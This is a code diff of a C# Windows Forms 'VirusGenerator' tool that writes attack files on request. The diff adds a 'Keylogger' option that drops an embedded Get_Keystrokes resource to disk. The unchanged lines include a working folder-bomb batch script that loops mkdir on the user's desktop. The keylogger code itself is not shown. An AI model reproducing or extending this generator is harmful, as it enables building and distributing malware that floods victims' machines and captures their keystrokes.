@@ -32,12 +32,15 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Reflection;
+using System.IO;
 
 namespace VirusGenerator
 {
     public partial class Troy : Form
     {
-        
+        string getKeys = Properties.Resources.Get_Keystrokes;
+
         string _outputFolder;
         string _fileName;
         string _fileExt;
@@ -58,6 +61,8 @@ namespace VirusGenerator
             _fileName = TxtBoxFileName.Text;
             _fileExt = CBoxFor.Text;
 
+            
+
             //Where the magic happens.
             if (CBoxAttack.Text == "Infinite Loop Attack" && _fileExt == ".bat")
             {
@@ -68,9 +73,17 @@ namespace VirusGenerator
             {
 
                 string[] folderBombAttackCmd = { "@echo off", "cd desktop", ":loop", "mkdir virus", "goto loop" };
-                System.IO.File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
+                File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
 
             }
+
+            if (CBoxAttack.Text == "Keylogger")
+            {
+
+                File.WriteAllText(_outputFolder + _fileName + _fileExt, getKeys);
+            }
+            
+
             if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
             {
                 if (_fileExt == ".bat")
@@ -133,6 +146,11 @@ namespace VirusGenerator
         private void textCompile()
         {
 
+        }
+
+        private void BtnDebug_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show(getKeys);
         }
     }
 }
